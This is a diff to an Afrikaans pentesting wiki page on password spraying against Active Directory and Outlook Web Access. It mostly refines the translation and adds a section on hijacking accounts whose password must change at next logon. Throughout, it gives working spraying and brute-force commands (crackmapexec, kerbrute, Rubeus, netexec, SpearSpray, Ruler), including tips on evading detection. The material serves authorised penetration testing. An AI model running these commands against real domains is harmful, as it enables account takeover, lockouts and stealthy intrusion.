@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Sodra jy verskeie **valid usernames** gevind het, kan jy die mees **common passwords** probeer (hou die password policy van die omgewing in gedagte) vir elkeen van die ontdekte gebruikers.\
-By **default** is die **minimum** **password** **length** **7**.
+Sodra jy verskeie **geldige gebruikersname** gevind het, kan jy met elke ontdekte gebruiker die mees **algemene wagwoorde** probeer (hou die wagwoordbeleid van die omgewing in gedagte).\
+Die **standaard** **minimum** **wagwoord** **lengte** is **7**.
 
-Lyste van common usernames kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Lyste van algemene gebruikersname kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Let wel dat jy sommige rekeninge kan lockout as jy verskeie wrong passwords probeer (by default meer as 10).
+Let wel dat jy **sommige rekeninge kan uitsluit as jy verskeie verkeerde wagwoorde probeer** (standaard meer as 10).
 
-### Get password policy
+### Kry wagwoordbeleid
 
-As jy user credentials of 'n shell as 'n domain user het kan jy **get the password policy with**:
+As jy inlogbewyse het of 'n shell as 'n domeingebruiker, kan jy **die wagwoordbeleid kry met**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Exploitation van Linux (of almal)
+### Exploitation vanaf Linux (of alles)
 
 - Gebruik **crackmapexec:**
 ```bash
@@ -47,11 +47,11 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(jy kan die aantal pogings aandui om lockouts te voorkom):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(jy kan die aantal pogings aandui om lockouts te vermy):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVELEN - SOMS WERK DIT NIE
+- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVEEL; SOMS WERK DIT NIE
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -60,7 +60,7 @@ python kerbrute.py -domain jurassic.park -users users.txt -password Password123 
 
 ![](<../../images/image (745).png>)
 
-- Met behulp van **rpcclient**:
+- Met **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -77,7 +77,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan standaard gebruikers uit die domein genereer en dit sal die wagwoordbeleid van die domein haal en pogings daarvolgens beperk):
+- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan standaard gebruikers uit die domein genereer en sal die wagwoordbeleid van die domein haal en pogings daarvolgens beperk):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -85,23 +85,55 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
+### Identifiseer en Oorneem "Password must change at next logon" Rekeninge (SAMR)
+
+’ n Lae-ruis-tegniek is om 'n onskadelike/leë wagwoord te spray en rekeninge wat STATUS_PASSWORD_MUST_CHANGE teruggee te vang. Dit dui aan dat die wagwoord gedwonge verval is en sonder om die ou wagwoord te ken verander kan word.
+
+Workflow:
+- Enumereer gebruikers (RID brute via SAMR) om die teikenlys te bou:
+
+{{#ref}}
+../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
+{{#endref}}
+```bash
+# NetExec (null/guest) + RID brute to harvest users
+netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+```
+- Spray 'n leë wagwoord en gaan voort op hits om rekeninge vas te vang wat by die volgende logon hul wagwoord moet verander:
+```bash
+# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
+netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
+```
+- Vir elke treffer, verander die wagwoord oor SAMR met NetExec se module (geen ou wagwoord benodig wanneer "must change" gestel is nie):
+```bash
+# Strong complexity to satisfy policy
+env NEWPASS='P@ssw0rd!2025#' ; \
+netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
+
+# Validate and retrieve domain password policy with the new creds
+netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
+```
+Operasionele notas:
+- Verseker jou host se klok is gesinchroniseer met die DC voordat Kerberos-gebaseerde operasies uitgevoer word: `sudo ntpdate <dc_fqdn>`.
+- ’n [+] sonder (Pwn3d!) in sommige modules (bv. RDP/WinRM) beteken dat die creds geldig is, maar die account nie interaktiewe aanmeldregte het nie.
+
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying verminder geraas teen SMB/NTLM/LDAP bind-pogings en stem beter ooreen met AD se lockout-beleid. SpearSpray kombineer LDAP-gedrewe targeting, 'n patroon-enjin, en beleidsbewustheid (domain policy + PSOs + badPwdCount buffer) om presies en veilig te spray. Dit kan ook gekompromitteerde principals in Neo4j tag vir BloodHound pathing.
+Kerberos pre-auth–based spraying verminder geraas vs SMB/NTLM/LDAP bind attempts en pas beter by AD lockout policies. SpearSpray koppel LDAP-driven targeting, 'n patroon-enjin, en beleidsbewustheid (domain policy + PSOs + badPwdCount buffer) om presies en veilig te spray. Dit kan ook compromised principals in Neo4j tag vir BloodHound pathing.
 
 Key ideas:
-- LDAP-gebruikersontdekking met paging en LDAPS-ondersteuning, opsioneel met aangepaste LDAP-filters.
-- Domain lockout policy + PSO-aware filtering om 'n konfigureerbare poging-buffer (threshold) oor te laat en te voorkom dat gebruikers geblokkeer word.
-- Kerberos pre-auth validering met vinnige gssapi bindings (genereer 4768/4771 op DCs in plaas van 4625).
-- Patroon-gebaseerde, per-gebruiker wagwoordgenerering met veranderlikes soos name en temporale waardes afgelei van elke gebruiker se pwdLastSet.
-- Deursetbeheer met threads, jitter, en maksimum versoeke per sekonde.
-- Opsionele Neo4j-integrasie om owned users vir BloodHound te merk.
+- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
+- Domain lockout policy + PSO-aware filtering om 'n konfigureerbare attempt buffer (threshold) oor te laat en te voorkom dat gebruikers vergrendel word.
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
+- Throughput control with threads, jitter, and max requests per second.
+- Optional Neo4j integration to mark owned users for BloodHound.
 
-Basic usage and discovery:
+Basiese gebruik en ontdekking:
 ```bash
 # List available pattern variables
 spearspray -l
@@ -112,7 +144,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-Teiken- en patroonbeheer:
+Teiken en patroonbeheer:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -121,7 +153,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Stealth en veiligheidskontroles:
+Stealth- en veiligheidskontroles:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -144,27 +176,27 @@ Oorsig van die patroonstelsel (patterns.txt):
 ```
 Beskikbare veranderlikes sluit in:
 - {name}, {samaccountname}
-- Tydelike waardes vanaf elke gebruiker se pwdLastSet (of whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Samestellingshelpers en org token: {separator}, {suffix}, {extra}
+- Tydsafhanklik vanaf elke gebruiker se pwdLastSet (of whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Samestellinghelpers en org token: {separator}, {suffix}, {extra}
 
-Bedryfsnotas:
+Operasionele notas:
 - Gee voorkeur aan navraag by die PDC-emulator met -dc om die mees gesaghebbende badPwdCount en beleidverwante inligting te lees.
-- badPwdCount-herstellings word geaktiveer by die volgende poging na die waarnemingsvenster; gebruik drempel en tydsberekening om veilig te bly.
-- Kerberos pre-auth pogings verskyn as 4768/4771 in DC-telemetrie; gebruik jitter en rate-limiting om in te pas.
+- badPwdCount-resette word op die volgende poging ná die waarnemingsvenster geaktiveer; gebruik drempel en tydsberekening om veilig te bly.
+- Kerberos pre-auth pogings verskyn as 4768/4771 in DC-telemetrie; gebruik jitter en rate-limiting om in te meng.
 
-> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
+> Wenk: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
 
 ## Outlook Web Access
 
 Daar is verskeie gereedskap vir p**assword spraying outlook**.
 
 - Met [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- Met [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- met [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
 - Met [Ruler](https://github.com/sensepost/ruler) (betroubaar!)
 - Met [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Met [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Om enige van hierdie gereedskap te gebruik, benodig jy 'n user list en 'n password / 'n klein lys van passwords om te spray.
+Om enige van hierdie gereedskap te gebruik, het jy 'n gebruikerslys en 'n password / 'n klein lys passwords nodig om te spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -194,6 +226,7 @@ Om enige van hierdie gereedskap te gebruik, benodig jy 'n user list en 'n passwo
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
